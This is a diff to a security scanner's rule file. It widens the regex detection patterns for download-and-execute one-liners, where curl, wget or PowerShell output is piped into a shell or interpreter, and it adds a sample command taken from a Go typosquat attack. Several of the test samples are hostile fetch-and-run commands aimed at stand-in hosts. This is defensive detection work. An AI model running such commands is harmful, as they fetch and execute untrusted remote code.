@@ -446,13 +446,16 @@ rules:
         # The program is the quoted one-liner on the command line and the fetched bytes
         # are its INPUT. `curl ... | sh` is the opposite: stdin is the program.
         #
+        # The interpreter may be named by its path (`| /bin/bash`, `| /usr/bin/python3`), as the
+        # 2025 Go typosquats' assembled command did (review 98).
+        #
         # So a code flag disqualifies the match -- `-e`, `-c`, `-n`, `-l`, `-p`, `-E`,
         # `-f` all mean the program came from the argument list. `sh -s` does not: it
         # reads stdin and passes the rest as positional arguments, which is exactly how
         # `curl https://sh.rustup.rs | sh -s -- -y` works, and that stays matched.
-        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b(?![ \t]+-[ceEflnp])'
-        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?python[0-9.]*\b(?![ \t]+-[cm])'
-        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b(?![ \t]+-[ceEflnprw])'
+        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:/(?:usr/)?(?:local/)?bin/)?(?:ba|z|k|da)?sh\b(?![ \t]+-[ceEflnp])'
+        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:/(?:usr/)?(?:local/)?bin/)?python[0-9.]*\b(?![ \t]+-[cm])'
+        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:/(?:usr/)?(?:local/)?bin/)?(?:node|perl|ruby|php)\b(?![ \t]+-[ceEflnprw])'
         # PowerShell, where `irm`/`Invoke-RestMethod` returns the body as a string and is the
         # usual half of the one-liner, and `curl`/`wget` are aliases of `iwr` in Windows
         # PowerShell 5.
@@ -496,6 +499,8 @@ rules:
         - '$o="$env:TEMP\\1.cmd"; & curl.exe -k -L -Ss "https://files.example.invalid/x.bat" -o $o; & $o'
         - 'curl -k -L -Ss https://files.example.invalid/x.bat -o $env:TEMP\\1.cmd; & $env:TEMP\\1.cmd'
         - "curl -sSL https://example.invalid/x | bash"
+        # The interpreter named by its path: the Go typosquats' `wget -O - URL | /bin/bash &`.
+        - "wget -O - https://example.invalid/s/x | /bin/bash &"
         - "eval \"$(curl -fsSL https://example.invalid/i.sh)\""
         - "IEX (New-Object Net.WebClient).DownloadString($u)"
         - "wget -qO- https://example.invalid/x | sudo sh"
